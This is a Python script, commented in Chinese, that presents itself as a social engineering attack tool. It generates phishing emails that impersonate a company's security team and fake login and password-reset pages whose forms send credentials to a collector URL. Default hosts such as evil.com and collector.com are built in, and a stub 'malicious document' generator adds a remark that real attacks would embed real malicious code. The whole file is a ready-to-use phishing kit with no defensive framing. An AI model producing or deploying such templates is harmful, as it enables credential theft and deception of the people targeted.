#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
社会工程学攻击工具
钓鱼攻击、恶意文档、社交工程
"""

import os
import random
from datetime import datetime

class SocialEngineeringTool:
    def __init__(self):
        self.templates = {}
        self.setup_templates()
    
    def setup_templates(self):
        """设置攻击模板"""
        # 钓鱼邮件模板
        self.templates['phishing_emails'] = {
            'password_reset': {
                'subject': '重要：您的账户需要密码重置',
                'body': '''尊敬的{name}用户：

我们检测到您的账户存在异常登录活动。为了保障您的账户安全，请立即重置密码。

请点击以下链接重置密码：
{malicious_link}

如果您未请求此操作，请忽略此邮件。

此致
{company_name}安全团队'''
            },
            'security_alert': {
                'subject': '安全警报：账户异常活动检测',
                'body': '''亲爱的{name}：

我们的系统检测到您的账户有可疑活动。请立即验证您的身份。

验证链接：{malicious_link}

如不验证，您的账户将在24小时后被暂停。

谢谢
{company_name}技术支持'''
            },
            'login_verification': {
                'subject': '登录验证请求',
                'body': '''您好{name}：

我们注意到您从新设备登录。请完成验证以确保账户安全。

验证页面：{malicious_link}

此验证将在2小时后过期。

{company_name}账户安全'''
            }
        }
        
        # 钓鱼页面模板
        self.templates['phishing_pages'] = {
            'login_page': '''<!DOCTYPE html>
<html>
<head>
    <title>{company_name} - 用户登录</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .login-box {{ width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }}
        input {{ width: 100%; padding: 8px; margin: 5px 0; }}
        button {{ background: #007bff; color: white; padding: 10px; border: none; width: 100%; }}
    </style>
</head>
<body>
    <div class="login-box">
        <h2>{company_name} 登录</h2>
        <form action="{collector_url}" method="post">
            <input type="text" name="username" placeholder="用户名/邮箱" required>
            <input type="password" name="password" placeholder="密码" required>
            <button type="submit">登录</button>
        </form>
        <p style="color: red;">{error_message}</p>
    </div>
</body>
</html>''',
            'password_reset': '''<!DOCTYPE html>
<html>
<head>
    <title>{company_name} - 密码重置</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 40px; }}
        .reset-box {{ width: 300px; margin: 0 auto; padding: 20px; border: 1px solid #ccc; }}
        input {{ width: 100%; padding: 8px; margin: 5px 0; }}
        button {{ background: #28a745; color: white; padding: 10px; border: none; width: 100%; }}
    </style>
</head>
<body>
    <div class="reset-box">
        <h2>重置您的密码</h2>
        <form action="{collector_url}" method="post">
            <input type="email" name="email" placeholder="注册邮箱" required>
            <input type="password" name="new_password" placeholder="新密码" required>
            <input type="password" name="confirm_password" placeholder="确认密码" required>
            <button type="submit">重置密码</button>
        </form>
    </div>
</body>
</html>'''
        }
    
    def generate_phishing_email(self, template_name, target_name, malicious_link, company_name="系统"):
        """生成钓鱼邮件"""
        print(f"📧 生成钓鱼邮件: {template_name}")
        
        template = self.templates['phishing_emails'][template_name]
        
        email_content = template['body'].format(
            name=target_name,
            malicious_link=malicious_link,
            company_name=company_name
        )
        
        email = f"主题: {template['subject']}\n\n{email_content}"
        
        # 保存邮件文件
        filename = f"phishing_email_{template_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(email)
        
        print(f"✅ 钓鱼邮件已保存: {filename}")
        return email
    
    def create_phishing_page(self, page_type, company_name, collector_url):
        """创建钓鱼页面"""
        print(f"🌐 创建钓鱼页面: {page_type}")
        
        template = self.templates['phishing_pages'][page_type]
        
        html_content = template.format(
            company_name=company_name,
            collector_url=collector_url,
            error_message=""
        )
        
        # 保存HTML文件
        filename = f"phishing_page_{page_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"✅ 钓鱼页面已保存: {filename}")
        return html_content
    
    def generate_malicious_document(self, doc_type="pdf"):
        """生成恶意文档"""
        print(f"📄 生成恶意文档: {doc_type}")
        
        # 创建虚假文档内容
        if doc_type == "pdf":
            content = f'''%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj

2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj

3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj

4 0 obj
<< /Length 100 >>
stream
BT /F1 12 Tf 100 700 Td (重要文档 - {datetime.now().strftime('%Y-%m-%d')}) Tj ET
endstream
endobj

xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
0000000202 00000 n 

trailer
<< /Size 5 /Root 1 0 R >>
startxref
300
%%EOF'''
            
            filename = f"malicious_document_{datetime.now().strftime('%Y%m%d_%H%M%S')}.pdf"
        else:
            # 简单的文本文档
            content = f'''重要通知

日期: {datetime.now().strftime('%Y-%m-%d')}

主题: 安全更新通知

内容: 请运行附件的安全更新程序以确保系统安全。

此文档包含机密信息，请妥善保管。'''
            
            filename = f"malicious_document_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(content)
        
        print(f"✅ 恶意文档已生成: {filename}")
        print("💡 实际攻击中应嵌入真正的恶意代码")
        return filename
    
    def run_social_engineering_attack(self):
        """运行社会工程学攻击"""
        print("=" * 70)
        print("          社会工程学攻击工具")
        print("=" * 70)
        
        print("🎯 可用的攻击类型:")
        print("1. 钓鱼邮件攻击")
        print("2. 钓鱼页面攻击") 
        print("3. 恶意文档攻击")
        print("4. 综合攻击套件")
        
        choice = input("\n请选择攻击类型 (1-4): ").strip()
        
        if choice == "1":
            # 钓鱼邮件攻击
            target_name = input("目标姓名: ").strip() or "用户"
            malicious_link = input("恶意链接: ").strip() or "http://evil.com/login"
            company = input("冒充公司: ").strip() or "系统安全"
            
            template = random.choice(list(self.templates['phishing_emails'].keys()))
            self.generate_phishing_email(template, target_name, malicious_link, company)
        
        elif choice == "2":
            # 钓鱼页面攻击
            page_type = input("页面类型 (login_page/password_reset): ").strip() or "login_page"
            company = input("冒充公司: ").strip() or "示例公司"
            collector = input("数据收集URL: ").strip() or "http://collector.com/data"
            
            self.create_phishing_page(page_type, company, collector)
        
        elif choice == "3":
            # 恶意文档攻击
            doc_type = input("文档类型 (pdf/txt): ").strip() or "pdf"
            self.generate_malicious_document(doc_type)
        
        elif choice == "4":
            # 综合攻击套件
            print("\n🔧 生成综合攻击套件...")
            
            # 生成钓鱼邮件
            email = self.generate_phishing_email(
                'password_reset', '目标用户', 'http://phishing.com/login', '系统安全'
            )
            
            # 生成钓鱼页面
            page = self.create_phishing_page(
                'login_page', '系统登录', 'http://collector.com/data'
            )
            
            # 生成恶意文档
            doc = self.generate_malicious_document('pdf')
            
            print("\n📋 综合攻击套件生成完成")
            print("💡 包含钓鱼邮件、钓鱼页面、恶意文档")
        
        else:
            print("❌ 无效选择")

def main():
    """主函数"""
    se_tool = SocialEngineeringTool()
    
    try:
        se_tool.run_social_engineering_attack()
    except Exception as e:
        print(f"❌ 攻击失败: {e}")

if __name__ == "__main__":
    main()